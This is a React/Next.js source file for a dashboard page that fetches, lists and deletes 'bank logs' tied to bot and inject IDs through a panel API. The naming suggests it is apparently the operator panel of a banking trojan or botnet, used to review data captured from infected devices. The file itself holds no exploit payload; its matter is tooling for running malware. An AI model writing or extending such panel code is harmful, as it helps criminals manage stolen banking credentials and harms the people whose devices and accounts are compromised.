import React, { useCallback, useRef, useMemo, useReducer, useState, useEffect } from 'react';
import Head from 'next/head';
import MagnifyingGlassIcon from '@heroicons/react/24/solid/MagnifyingGlassIcon';
import { Box, Button, Select, InputLabel, MenuItem, ListItemIcon, InputAdornment, OutlinedInput, Container, Stack, Card, CardHeader, CardActions, Divider, CardContent, SvgIcon, Grid, FormControlLabel, Typography, Checkbox, Link } from '@mui/material';
import { useSelection } from 'src/hooks/use-selection';
import { Layout as DashboardLayout } from 'src/layouts/dashboard/layout';
import { CustomersTable } from 'src/sections/logs-section/logs-table';
import { CustomersSearch } from 'src/sections/customer/customers-search';
import { applyPagination } from 'src/utils/apply-pagination';
import { formatTime } from 'src/utils/formattime';
import SettingsContext from '../../settings';
import $ from 'jquery';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faArrowLeft, faTrashCan } from '@fortawesome/free-solid-svg-icons';
import { checkperms } from 'src/utils/checkperms';
import { toast } from 'react-toastify';
const now = new Date();

const useCustomerIds = (customers) => {
  return useMemo(
    () => {
      return customers.map((customer) => customer.idinj);
    },
    [customers]
  );
};

const Page = () => {

  let data = [];
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(100);
  const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
  const customersIds = useCustomerIds(customers);
  const customersSelection = useSelection(customersIds);
  const [showOptions, setShowOptions] = useState(false);
  const countRef = useRef(0);

  useEffect(() => {
    if (!checkperms(2)){
      return
    }

    newCustomers()
    SettingsContext.SelectedBots = [];

    if (SettingsContext.autoUpdateEnable) {
      const interval = setInterval(() => {
        countRef.current++;
        newCustomers()
      }, 30000); // 10 seconds
  
      return () => clearInterval(interval);
    }

    

  }, []);
  
  const deletebots = async () => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
         'params': new Buffer('{"request":"deleteLogsBank","idinj":"' + SettingsContext.SelectedBots.join(",") + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });

    request.done(function(msg) {
      if(JSON.parse(msg).message === "ok") {
        if (SettingsContext.SelectedBots.length > 1) {
          toast.success("Deleted Logs " + SettingsContext.SelectedBots.join(",") + " from Panel")
        } else {
          toast.success("Deleted Logs " + SettingsContext.SelectedBots.join(",") + " from Panel")
        }
      } else {
        toast.error("Erorr deleting bots")
      }
      SettingsContext.SelectedBots = [];
      newCustomers()
    }.bind(this));
  }

  const newCustomers = async () => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"getLogsBank","tag":"test","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });

    request.done(function(msg) {
      let response = (JSON.parse(msg))
      let responsedata = response.logsBanks
      var data = [];

      responsedata.forEach((stats) => {
        const { idinj, idbot, application, comment, logs } = stats;
        var logsfinal = JSON.parse(atob(logs))
        
        data.push({  idinj, idbot, application, comment, logs: logsfinal});
      });

      setCustomers(applyPagination(data, SettingsContext.CurrentPageLogs, SettingsContext.RowsPerPageLogs))
      SettingsContext.CountLogs = data.length
      
      
    }.bind(this));
    
  };

  const handleButtonClick = () => {
    setShowOptions(!showOptions);
  };

  const handlePageChange = useCallback(
    (event, value) => {
      setPage(value);
      SettingsContext.CurrentPageLogs = value
      newCustomers()
    },
    []
  );



  const handleRowsPerPageChange = useCallback(
    (event) => {
      setRowsPerPage(event.target.value);
      SettingsContext.RowsPerPageLogs = event.target.value
      newCustomers()
    },
    []
  );

      if (!checkperms(2)){
        return (
          <>
              <Head>
                <title>
                  Logs
                </title>
              </Head>
              <Box
                component="main"
                sx={{
                  flexGrow: 1,
                  py: 8
                }}
              >
                <Container maxWidth="xl">
                  <Stack spacing={3}>
                    <div>
                    <Link href="/" style={{ textDecoration: 'none' }}>
                        <Button
                          startIcon={(
                            <FontAwesomeIcon icon={faArrowLeft} />
                          )}
                          variant="contained"
                        >
                          Back
                        </Button>
                    </Link>
                    </div>
                    <center><Typography fontSize={32}>You arent allowed here</Typography></center>
                    </Stack>
                    </Container>
              </Box>
          </>
        )
      }

      return (
        <>
          <Head>
            <title>
              Bots
            </title>
          </Head>
          <Box
            component="main"
            sx={{
              flexGrow: 1,
              py: 8
            }}
          >
            <Container maxWidth="xl">
              <Stack spacing={3}>
                <Stack
                  direction="row"
                  justifyContent="space-between"
                  spacing={4}
                >
                  <Stack spacing={1}>
                    <Typography variant="h4">
                      Logs
                    </Typography>
                    <Stack
                      alignItems="center"
                      direction="row"
                      spacing={1}
                    >
                    </Stack>
                  </Stack>
                  <div>
                    <Button
                      onClick={deletebots}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete Selected
                    </Button>
                  </div>
                </Stack>
                <CustomersTable
                  count={SettingsContext.CountLogs}
                  items={customers}
                  onDeselectAll={customersSelection.handleDeselectAll}
                  onDeselectOne={customersSelection.handleDeselectOne}
                  onPageChange={handlePageChange}
                  onRowsPerPageChange={handleRowsPerPageChange}
                  onSelectAll={customersSelection.handleSelectAll}
                  onSelectOne={customersSelection.handleSelectOne}
                  page={page}
                  rowsPerPage={rowsPerPage}
                  selected={customersSelection.selected}
                />
              </Stack>
            </Container>
          </Box>
        </>
      );
    }

Page.getLayout = (page) => (
  <DashboardLayout>
    {page}
  </DashboardLayout>
);

export default Page;
